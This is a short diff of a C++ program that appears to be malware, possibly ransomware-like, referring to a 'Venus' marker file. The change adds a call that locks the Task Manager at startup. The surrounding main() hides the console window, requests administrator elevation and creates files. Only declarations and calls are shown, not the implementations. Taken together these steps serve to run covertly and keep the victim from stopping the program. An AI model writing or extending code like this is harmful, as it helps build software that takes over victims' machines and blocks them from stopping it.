@@ -55,9 +55,12 @@ void requestElevation();
 
 void randomKeys();
 
+void lockTaskManager(bool Lock);
+
 int main() {
     ShowWindow(GetConsoleWindow(), SW_HIDE);
     requestElevation();
+    lockTaskManager(true);
     if(std::ifstream(std::string(userPath) + "\\AppData\\Local\\Venus\\venus")) {
         createFiles(10, 1);
         bool ok = false;
